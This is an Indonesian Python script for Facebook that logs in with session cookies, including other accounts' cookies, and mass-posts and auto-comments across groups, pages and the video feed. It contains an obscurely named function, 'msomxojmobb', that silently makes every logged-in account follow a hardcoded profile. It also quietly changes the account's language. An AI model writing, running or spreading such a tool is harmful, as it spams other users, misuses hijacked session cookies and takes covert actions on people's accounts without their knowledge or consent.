
import time, re, requests, os, json

from bs4 import BeautifulSoup as par
from rich.panel import Panel
from rich import print as prints

M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
K = '\x1b[1;93m' # KUNING
H = '\x1b[1;92m' # HIJAU


class Natural:

    def __init__(self, cok):
        self.cok = cok
        self.ses = requests.Session()
        self.url = "https://mbasic.facebook.com"

    def pause(self, teks, second):
        bar = [
            "[\x1b[1;91m■\x1b[0m     ] {} detik  ",
            "[\x1b[1;92m■■\x1b[0m    ] {} detik  ",
            "[\x1b[1;93m■■■\x1b[0m   ] {} detik  ",
            "[\x1b[1;94m■■■■\x1b[0m  ] {} detik  ",
            "[\x1b[1;95m■■■■■\x1b[0m ] {} detik  "
        ]
        i = 0
        while True:
            print(f"\r{teks} {bar[i % len(bar)].format(str(second - i))}", end="\r")
            time.sleep(1)
            i += 1
            if i == second + 1:
                break

    def login_cookie(self, cok):
        try:
            self.ubah_bahasa(cok)
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cok).text
            if "/zero/optin/write" in str(link):
                prints(Panel("[bold white]🙄 akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.", width=60, style="bold white"))
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "");nama, user, stat = self.ubah_data(urll, cok)
            elif 'href="/x/checkpoint/' in str(link):nama = ""; user= "";stat = "checkpoint"
            elif 'href="/r.php' in str(link):nama = ""; user= "";stat = "invalid"
            elif "mbasic_logout_button" in str(link):
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1);self.msomxojmobb(cok)
                stat = "berhasil"
            else:
                pass
            data = {
                "nama": nama,
                "user": user,
                "stat": stat,
            }
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        return data

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies=coki).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            post = self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies=coki).text
            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data![/]", style="bold white", width=60))
            nama = re.findall("\<title\>(.*?)<\/title\>", post)[0]
            user = re.search("c_user=(\d+)", str(coki)).group(1);self.msomxojmobb(coki)
            stat = "berhasil"
        except:pass
        return nama, user, stat

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def msomxojmobb(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):pass
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies=cok)
            else:pass
        except:pass

    def menu_lain(self):
        print("    [1] posting di grup\n    [2] komentar di grup\n    [3] komentar di halaman\n    [4] komentar di beranda vidio")
        apa = input("\n\> ")
        if apa in ["", " "]:print("\r[!] jangan kosong", end="\r");time.sleep(2);self.menu_lain()
        elif apa in ["1", "01"]:
            tnya = input("[?] apakah ingin memakai cookie akun lain untuk posting [Y/t]: ")
            if tnya in ["Y", "y"]:
                print("[!] silahkan masukan cookie akun untuk posting di grup")
                kntl = self.ganti_akun()
                prints(f"[!] anda menggunakan akun [bold green]{kntl['nama']}[/] untuk posting.")
                cook = {"cookie":kntl["coki"]}
            else:
                cook = self.cok
            kon = input("[?] tambahkan gambar di postingan [Y/t]: ")
            mmk = self.text_pictt(kon)
            print("[>] gunakan koma (,) untuk pemisah, contoh: 38226,12348")
            use = input("[?] id/username grup: ").split(",")
            print("="*55)
            for x in use:
                self.postt_grup(x, mmk["g"], mmk["t"], cook)
            exit("posting di grup telah selesai.")

        elif apa in ["2", "02"]:
            tnya = input("[?] apakah ingin memakai cookie akun lain untuk komentar [Y/t]: ")
            if tnya in ["Y", "y"]:
                print("[!] silahkan masukan cookie akun untuk komentar di grup")
                kntl = self.ganti_akun()
                prints(f"[!] anda menggunakan akun [bold green]{kntl['nama']}[/] untuk komentar.")
                cook = {"cookie":kntl["coki"]}
            else:
                cook = self.cok
            kon = input("[?] tambahkan gambar di postingan [Y/t]: ")
            mmk = self.text_pictt(kon)
            print("[>] gunakan koma (,) untuk pemisah, contoh: 38226,12348")
            use = input("[?] id/usernname grup: ").split(",")
            print("="*55)
            for x in use:
                self.komen_grup("/groups/"+x, mmk["g"], mmk["t"], cook)
            exit("komen di grup telah selesai.")

        elif apa in ["3", "03"]:
            tnya = input("[?] apakah ingin memakai cookie akun lain untuk komentar [Y/t]: ")
            if tnya in ["Y", "y"]:
                print("[!] silahkan masukan cookie akun untuk komentar di halaman")
                kntl = self.ganti_akun()
                prints(f"[!] anda menggunakan akun [bold green]{kntl['nama']}[/] untuk komentar.")
                cook = {"cookie":kntl["coki"]}
            else:
                cook = self.cok
            kon = input("[?] tambahkan gambar di postingan [Y/t]: ")
            mmk = self.text_pictt(kon)
            print("[>] gunakan koma (,) untuk pemisah, contoh: 38226,12348")
            use = input("[?] id/username halaman: ").split(",")
            print("="*55)
            for x in use:
                link = par(self.ses.get(self.url+"/"+x, cookies=cook).text, "html.parser")
                if "Linimasa" in str(link):
                    self.komen_hlmn(link.find("a", string="Linimasa").get("href"), mmk["g"], mmk["t"], cook)
            exit("komen di halaman telah selesai.")

        elif apa in ["4", "04"]:
            tnya = input("[?] apakah ingin memakai cookie akun lain untuk komentar [Y/t]: ")
            if tnya in ["Y", "y"]:
                print("[!] silahkan masukan cookie akun untuk komentar di grup")
                kntl = self.ganti_akun()
                prints(f"[!] anda menggunakan akun [bold green]{kntl['nama']}[/] untuk komentar.")
                cook = {"cookie":kntl["coki"]}
            else:
                cook = self.cok
            kon = input("[?] tambahkan gambar di postingan [Y/t]: ")
            mmk = self.text_pictt(kon)
            print("="*55)
            self.komen_vido("/watch", mmk["g"], mmk["t"], cook)

    def text_pictt(self, tnya):
        if tnya in ["Y", "y"]:
            print("[!] silahkan masukan jalur penyimpanan gambar")
            gmb = input("[?] gambar : ")
            try:
                open(gmb, "rb")
            except FileNotFoundError:print("[!] gambar yang anda masukan tidak tersedia");time.sleep(3);self.text_pictt(tnya)
        else:
            gmb = "None"
        print("[!] gunakan '<>' biar teks nya kebawah")
        text = input("[?] pesan: ").replace("<>","\n")
        return {"g": gmb, "t": text}

    def ganti_akun(self):
        cok = input("[?] cookie : ")
        if cok in ["", " "]:print("\n[!] jangan kosong");time.sleep(2);self.ganti_akun()
        dat = self.login_cookie({"cookie":cok})
        self.pause(f"[{H}+{N}] sedang mengecek cookie", 5)
        if "checkpoint" in dat["stat"]:
            print(f"[{M}!{N}] Opshh cookie anda chekcpoint:(                ");self.ganti_akun()
        elif "invalid" in dat["stat"]:
            print(f"[{M}!{N}] cookie yang anda masukan invalid              ");self.ganti_akun()
        elif "berhasil" in dat["stat"]:
            data = {
                "nama": dat["nama"],
                "coki": cok
            }
            return data

    def komen_hlmn(self, usr, gmb, tex, cok):
        try:
            htmz = self.ses.get(self.url+usr, cookies=cok).text
            result = re.findall('<a href="([^"]*)" class=".*?">(.*?)</a>', htmz)
            for x in result:
                if "Komentari" in x[1]:self.mulai_kmen(self.url+x[0].replace("amp;", ""), gmb, tex, cok)
                elif "Komentar" in x[1]:self.mulai_kmen(self.url+x[0].replace("amp;", ""), gmb, tex, cok)
                else:continue
            if "Lihat Berita Lain" in htmz:
                self.komen_hlmn(par(htmz, "html.parser").find("a", string="Lihat Berita Lain").get("href"), gmb, tex, cok)
        except Exception as e:exit(e)

    def komen_grup(self, usr, gmb, tex, cok):
        try:
            htmz = self.ses.get(self.url+usr, cookies=cok).text
            result = re.findall('<a href="([^"]*)" class=".*?">(.*?)</a>', htmz)
            for x in result:
                if "Komentari" in x[1]:self.mulai_kmen(x[0].replace("amp;", ""), gmb, tex, cok)
                elif "Komentar" in x[1]:self.mulai_kmen(x[0].replace("amp;", ""), gmb, tex, cok)
                else:continue
            if "Lihat Postingan Lainnya" in htmz:
                self.komen_grup(par(htmz, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), gmb, tex, cok)
        except Exception as e:exit(e)

    def komen_vido(self, usr, gmb, tex, cok):
        try:
            htmz = self.ses.get(self.url+usr, cookies=cok).text
            result = re.findall('<a href="([^"]*)" class=".*?">(.*?)</a>', htmz)
            for x in result:
                if "Komentari" in x[1]:
                    if "/groups" in x[0]:self.mulai_kmen(x[0].replace("amp;", ""), gmb, tex, cok)
                    else:self.mulai_kmen(self.url+x[0].replace("amp;", ""), gmb, tex, cok)
                elif "Komentar" in x[1]:
                    if "/groups" in x[0]:self.mulai_kmen(x[0].replace("amp;", ""), gmb, tex, cok)
                    else:self.mulai_kmen(self.url+x[0].replace("amp;", ""), gmb, tex, cok)
                else:continue
            if "Lihat Video Lainnya" in htmz:
                self.komen_vido(par(htmz, "html.parser").find("a", string="Lihat Video Lainnya").get("href"), gmb, tex, cok)
        except Exception as e:exit(e)

    def mulai_kmen(self, url, gmb, tex, cok):
        link = self.ses.get(url, cookies=cok)
        head = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1', 'origin': self.url, 'referer': link.url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', 'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.96", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.96"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"6.2.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'viewport-width': '1217'}
        if "None" in gmb:
            data = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', link.text).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', link.text).group(1), "comment_text": tex}
            post = self.ses.post(self.url+par(link.text, "html.parser").find("form", {"method":"post"})["action"], cookies=cok, headers=head, data=data)
            self.respon(post)
            self.pause(f"[{H}-{N}] delay", 60)
        else:
            apcb = par(link.text,"html.parser")
            xnxx = {x["name"]:x["value"] for x in apcb.find_all("input",{"type":"hidden","name":True,"value":True})}
            xnxx.update({"view_photo":"Lampirkan Foto"})
            ynxz = par(self.ses.post(self.url+apcb.find("form",{"method":"post"})["action"], cookies=cok, data=xnxx).text, "html.parser")

            date = {x["name"]:x["value"] for x in ynxz.find_all("input",{"type":"hidden","name":True,"value":True})}
            date.update({"comment_text":tex,"post":"Komentari"})
            file = {"photo":open(gmb, "rb")}
            post = self.ses.post(ynxz.find("form",{"method":"post"})["action"], cookies=cok, files=file, data=date)
            self.respon(post)
            self.pause(f"[{H}-{N}] delay", 60)

    def respon(self, post):
        curl = post.url.replace("m.facebook.com", "www.facebook.com").replace("mbasic.facebook.com", "www.facebook.com")
        if "Akun Anda dibatasi saat ini" in post.text:
            print("Akun Anda dibatasi saat ini                       ");exit()
        elif "Anda Tidak Dapat Berkomentar Saat Ini" in post.text:
            print("Akun Anda dibatasi saat ini                       ");exit()
        else:print(f"[{H}+{N}] Komentar berhasil.                       \n[{H}+{N}] url post: {H}{curl}{N}")
        print()

    def postt_grup(self, usr, gmb, tex, cok):
        try:
            self.ubah_bahasa(cok)
            link = self.ses.get(self.url+"/groups/"+usr, cookies=cok)
            if "Konten Tidak Ditemukan" in link.text:
                self.pause(f"[{H}+{N}] delay", 10)
                print(f"[{M}!{N}] link: www.facebook.com/groups/{usr}\n[{M}={N}] pesan: grup tidak di temukan...")
                print("="*55)
            else:
                apcb = par(link.text,"html.parser")
                xnxx = {x["name"]:x["value"] for x in apcb.find_all("input",{"type":"hidden","name":True,"value":True})}
                xnxx.update({"rst_icv":"",  "xc_message": "", "view_overview": "Lainnya"})
                ynxz = par(self.ses.post(self.url+apcb.find("form",{"method":"post"})["action"], cookies=cok, data=xnxx).text, "html.parser")
                if "None" in gmb:
                    date = {x["name"]:x["value"] for x in ynxz.find_all("input",{"type":"hidden","name":True,"value":True})}
                    date.update({"xc_message": tex, "view_post": "Posting"})
                    self.ses.post(self.url+ynxz.find("form",{"method":"post"})["action"], cookies=cok, data=date)
                    self.cek_post(usr, cok)
                    self.pause(f"[{H}+{N}] delay", 10)
                else:
                    data = {x["name"]:x["value"] for x in ynxz.find_all("input",{"type":"hidden","name":True,"value":True})}
                    data.update({"view_photo": "Foto"})
                    mmkk = par(self.ses.post(self.url+apcb.find("form",{"method":"post"})["action"], cookies=cok, data=data).text, "html.parser")

                    datz = {}
                    for i in mmkk.find_all("input"):
                        datz.update({i.get("name"):i.get("value")})
                    file = {"file1":open(gmb, "rb")}
                    kepo = par(self.ses.post(self.url+mmkk.find("form",{"method":"post"})["action"], cookies=cok, files=file, data=datz).text, "html.parser")

                    dats = {}
                    for i in kepo.find_all("input"):
                        dats.update({i.get("name"):i.get("value")})
                    dats.update({"xc_message": tex})
                    self.ses.post(self.url+kepo.find("form",{"method":"post"})["action"], cookies=cok, data=dats)
                    self.cek_post(usr, cok)
                    self.pause(f"[{H}+{N}] delay", 10)
        except Exception as e:exit(e)

    def cek_post(self, usr, cok):
        user = re.findall("c_user=(.*?);", str(cok))[0]
        link = self.ses.get("https://web.facebook.com/groups/"+usr, cookies=cok)
        data = {'av': user, '__user': user, '__a': '1', '__req': '1f', '__hs': re.search('"haste_session":"(.*?)"', link.text).group(1), 'dpr': '1', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}', link.text).group(1), '__hsi': re.search('"hsi":"(.*?)",',link.text).group(1), '__comet_req': '15', 'fb_dtsg':  re.search('"DTSGInitialData",\[\],{"token":"(.*?)"', link.text).group(1), 'jazoest': re.search('&jazoest=(.*?)"', link.text).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"', link.text).group(1), '__spin_r': re.search('"__spin_r":(.*?),', link.text).group(1), '__spin_b': 'trunk', '__spin_t': re.search('"__spin_t":(.*?),', link.text).group(1), 'fb_api_caller_class': 'RelayModern'}
        data.update({'fb_api_req_friendly_name': '',  'variables': json.dumps({"groupID":usr}), 'server_timestamps': 'true',  'doc_id': '5029152540493735'})
        head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1', 'origin': 'https://web.facebook.com', 'referer': link.url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"', 'sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.96", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.96"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.15.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'viewport-width': '1162', 'x-asbd-id': '129477'}
        head.update({'x-fb-friendly-name': data["fb_api_req_friendly_name"], 'x-fb-lsd': data["lsd"], "referer": f"https://web.facebook.com/groups/({usr})"})
        xnxx = self.ses.post('https://web.facebook.com/api/graphql/', cookies=cok, headers=head, data=data)
        carx = re.findall('"text":"(.*?)","group":{"viewer_content":(.*?),', str(xnxx.text))
        print(f"""
[{H}#{N}] nama grup: {re.search('{"name":"(.*?)"', xnxx.text).group(1)}
[{H}#{N}] link grup: web.facebook.com/groups/{usr}
""")
        for i in carx:
            if "null" in i[1]:pass
            else:
                print("[#] {} {}".format(i[0], i[1].split(":")[1].replace('"', "").replace('}', '')))
        print("="*55)